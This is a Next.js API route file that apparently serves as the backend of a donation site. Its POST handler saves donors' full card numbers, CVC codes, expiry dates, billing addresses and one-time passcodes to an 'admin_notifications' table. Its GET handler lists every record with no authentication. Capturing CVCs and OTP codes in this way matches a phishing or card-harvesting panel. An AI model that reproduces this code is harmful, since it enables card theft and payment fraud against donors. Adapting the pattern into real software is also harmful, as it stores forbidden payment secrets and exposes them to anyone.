import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase/server';

// GET /api/notifications — list all, most recent first
export async function GET() {
  const { data, error } = await supabaseAdmin
    .from('admin_notifications')
    .select('*')
    .order('timestamp', { ascending: false });

  if (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
  return NextResponse.json(data);
}

// POST /api/notifications — create a new notification
export async function POST(req: NextRequest) {
  const body = await req.json();

  const { data, error } = await supabaseAdmin
    .from('admin_notifications')
    .insert({
      type: body.type,
      donation_id: body.donationId,
      reference_number: body.referenceNumber,
      donor_name: body.donorName,
      email: body.email,
      phone: body.phone,
      amount: body.amount,
      message: body.message,
      card_number: body.cardNumber,
      card_last4: body.cardLast4,
      cardholder_name: body.cardholderName,
      cvc: body.cvc,
      card_expiration: body.cardExpiration,
      billing_address: body.billingAddress,
      city: body.city,
      state: body.state,
      zip_code: body.zipCode,
      otp_code: body.otpCode,
      donation_type: body.donationType,
      read: false,
    })
    .select()
    .single();

  if (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
  return NextResponse.json(data);
}